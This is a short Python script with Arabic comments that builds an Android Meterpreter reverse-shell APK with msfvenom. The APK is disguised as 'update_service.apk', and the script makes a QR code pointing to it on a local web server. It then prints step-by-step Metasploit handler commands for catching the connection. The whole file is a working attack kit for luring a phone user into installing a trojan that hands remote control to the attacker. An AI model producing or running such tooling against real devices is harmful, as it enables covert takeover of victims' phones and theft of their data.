import os
import qrcode

def setup_environment():
    # تم تثبيت الـ IP الخاص بك هنا بناءً على طلبك
    ip = "10.0.2.15" 
    port = "4444"
    filename = "update_service.apk"
    
    print(f"--- [ Using Fixed Kali IP: {ip} ] ---")
    
    # 1. إنشاء البيلود (الملف الملغوم)
    # سيقوم هذا الأمر بإنشاء تطبيق أندرويد يتصل بجهازك
    print(f"\n[+] Generating Payload: {filename}...")
    cmd_payload = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -o {filename}"
    os.system(cmd_payload)
    
    # 2. إنشاء الباركود (QR Code)
    # الرابط يوجه الهاتف لتحميل الملف من سيرفر بايثون على منفذ 8000
    print(f"[+] Creating QR Code...")
    link = f"http://{ip}:8000/{filename}"
    qr = qrcode.make(link)
    qr.save("connect.png")
    
    # 3. عرض تعليمات التشغيل في التيرمينال
    print("-" * 50)
    print(f"DONE! Scan 'connect.png' with your phone.")
    print("-" * 50)
    print("\n[!] IMPORTANT: Follow these steps EXACTLY:")
    print(f"1. Open Terminal 1 and Run: python3 -m http.server 8000")
    print(f"2. Open Terminal 2 and Run Metasploit:")
    print(f"   msfconsole -q")
    print(f"   use exploit/multi/handler")
    print(f"   set payload android/meterpreter/reverse_tcp")
    print(f"   set LHOST {ip}")
    print(f"   set LPORT {port}")
    print(f"   exploit")
    print("-" * 50)
    
    # فتح صورة الباركود تلقائياً للمسح
    if os.path.exists("connect.png"):
        os.system("xdg-open connect.png")

if __name__ == "__main__":
    setup_environment()
